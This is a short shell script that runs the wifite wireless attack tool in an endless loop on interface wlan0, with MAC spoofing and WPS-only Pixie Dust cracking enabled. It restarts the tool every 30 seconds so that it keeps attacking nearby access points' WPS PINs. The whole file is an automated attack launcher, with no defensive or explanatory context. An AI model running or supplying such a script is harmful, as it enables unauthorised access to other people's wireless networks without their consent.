#!/bin/sh
while (true)
do
sleep 30 && killall wifite & wifite -i wlan0 -p 8 -mac --wps --wps-only --pixie --wps-fails 1 --wps-timeouts 1 --wps-time 8;
sleep 5;
done;
